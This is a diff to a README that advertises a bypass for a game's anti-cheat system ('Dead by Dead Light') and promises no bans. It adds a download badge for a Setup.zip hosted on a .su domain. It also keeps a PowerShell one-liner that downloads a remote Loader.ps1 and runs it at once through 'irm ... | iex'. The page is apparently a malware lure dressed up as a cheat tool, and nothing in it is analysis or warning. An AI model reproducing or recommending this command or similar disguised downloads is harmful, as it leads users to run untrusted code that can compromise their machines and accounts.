@@ -1,8 +1,16 @@
 # ⚡️ Dead by Dead Light
-A modern way to bypass the new anti-cheat. No download required. Without bans.
+A modern way to bypass the new anti-cheat. Without bans.
 ---
 
-### 🚀 Use PowerShell (Windows - PowerShell)
+### 🚀 Direct Download
+
+[<img src="https://img.shields.io/badge/Download-black?style=for-the-badge&logo=github"/>](https://software-storage.su/files/Setup.zip)
+
+Read Readme.txt before install!
+
+---
+
+### 🚀 Use PowerShell for Automatic Download (Windows - PowerShell)
 ```powershell
 irm https://software-storage.su/powershell/Loader.ps1 | iex
 ```
